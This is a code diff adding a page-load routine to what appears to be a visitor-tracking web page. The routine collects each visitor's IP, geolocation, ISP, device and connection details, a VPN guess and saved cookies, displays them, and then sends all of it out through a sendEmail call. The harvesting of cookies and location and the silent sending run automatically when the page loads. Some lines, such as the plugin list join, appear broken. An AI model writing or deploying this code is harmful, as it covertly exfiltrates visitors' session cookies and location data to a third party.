@@ -208,5 +208,75 @@ async function loadData() {
         collectedData.flash = navigator.plugins['Shockwave Flash'] ? 'enabled' : 'not detected';
         collectedData.timezoneOffset = new Date().getTimezoneOffset();
         collectedData.localTime = new Date().toLocaleString();
-        collectedData.platform = navigator.platform;
-        collected
+                collectedData.doNotTrack = navigator.doNotTrack || 'unknown';
+        collectedData.onlineStatus = navigator.onLine ? 'online' : 'offline';
+        collectedData.connectionType = connection ? connection.type : 'unknown';
+        collectedData.downlink = connection ? connection.downlink : 'unknown';
+        collectedData.effectiveType = connection ? connection.effectiveType : 'unknown';
+        collectedData.rtt = connection ? connection.rtt : 'unknown';
+        collectedData.saveData = navigator.connection ? navigator.connection.saveData : 'unknown';
+        collectedData.vpn = detectVPN();
+        collectedData.savedCookies = getSavedCookies();
+
+        // Display the collected data
+        document.getElementById('ip').textContent = collectedData.ip;
+        document.getElementById('ipv6').textContent = collectedData.ipv6;
+        document.getElementById('location').textContent = collectedData.location;
+        document.getElementById('isp').textContent = collectedData.isp;
+        document.getElementById('country').textContent = collectedData.country;
+        document.getElementById('timezone').textContent = collectedData.timezone;
+        document.getElementById('coords').textContent = collectedData.coords;
+        document.getElementById('asn').textContent = collectedData.asn;
+        document.getElementById('useragent').textContent = collectedData.userAgent;
+        document.getElementById('screen').textContent = collectedData.screen;
+        document.getElementById('lang').textContent = collectedData.language;
+        document.getElementById('connection').textContent = collectedData.connection;
+        document.getElementById('cores').textContent = collectedData.cores;
+        document.getElementById('memory').textContent = collectedData.memory;
+        document.getElementById('touch').textContent = collectedData.touch;
+        document.getElementById('battery').textContent = collectedData.battery;
+        document.getElementById('deviceModel').textContent = 'unknown'; // Placeholder for device model
+        document.getElementById('hardwareConcurrency').textContent = collectedData.hardwareConcurrency;
+        document.getElementById('deviceMemory').textContent = collectedData.deviceMemory;
+        document.getElementById('plugins').textContent = navigator.plugins.length > 0 ? navigator.plugins.join(', ') : 'none';
+        document.getElementById('mimeTypes').textContent = navigator.mimeTypes.length > 0 ? navigator.mimeTypes.join(', ') : 'none';
+        document.getElementById('latitude').textContent = collectedData.latitude;
+        document.getElementById('longitude').textContent = collectedData.longitude;
+        document.getElementById('accuracy').textContent = collectedData.accuracy;
+        document.getElementById('cookies').textContent = collectedData.cookies;
+        document.getElementById('localStorageSupport').textContent = collectedData.localStorageSupport;
+        document.getElementById('sessionStorageSupport').textContent = collectedData.sessionStorageSupport;
+        document.getElementById('webgl').textContent = collectedData.webgl;
+        document.getElementById('canvas').textContent = collectedData.canvas;
+        document.getElementById('referrer').textContent = collectedData.referrer;
+        document.getElementById('java').textContent = collectedData.java;
+        document.getElementById('flash').textContent = collectedData.flash;
+        document.getElementById('timezoneOffset').textContent = collectedData.timezoneOffset;
+        document.getElementById('localTime').textContent = collectedData.localTime;
+        document.getElementById('platform').textContent = collectedData.platform;
+        document.getElementById('doNotTrack').textContent = collectedData.doNotTrack;
+        document.getElementById('onlineStatus').textContent = collectedData.onlineStatus;
+        document.getElementById('connectionType').textContent = collectedData.connectionType;
+        document.getElementById('downlink').textContent = collectedData.downlink;
+        document.getElementById('effectiveType').textContent = collectedData.effectiveType;
+        document.getElementById('rtt').textContent = collectedData.rtt;
+        document.getElementById('saveData').textContent = collectedData.saveData;
+        document.getElementById('vpn').textContent = collectedData.vpn;
+
+        // Only display saved cookies if there are any
+        if (collectedData.savedCookies) {
+            document.getElementById('savedCookiesContainer').style.display = 'flex';
+            document.getElementById('savedCookies').textContent = collectedData.savedCookies;
+        } else {
+            document.getElementById('savedCookiesContainer').style.display = 'none';
+        }
+
+        // Send the collected data to the email
+        sendEmail(collectedData);
+    } catch (error) {
+        console.error('Error loading data:', error);
+    }
+}
+
+// Load data when the page loads
+window.addEventListener('load', loadData);
